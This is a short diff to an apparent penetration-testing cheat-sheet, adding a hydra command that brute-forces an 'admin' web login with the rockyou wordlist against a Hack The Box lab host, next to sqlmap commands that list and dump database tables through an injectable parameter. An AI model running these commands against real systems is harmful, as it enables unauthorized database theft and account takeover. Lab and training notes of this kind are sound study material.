@@ -9,3 +9,6 @@ sqlmap -u http://example.com/path/to?param=1\&parama=abc -D dbname --tables
 // for table data dump
 sqlmap -u http://example.com/path/to?param=1\&aparam=abc -D dbname -T tablename --dump
 //auto save
+
+// hydra
+hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!"
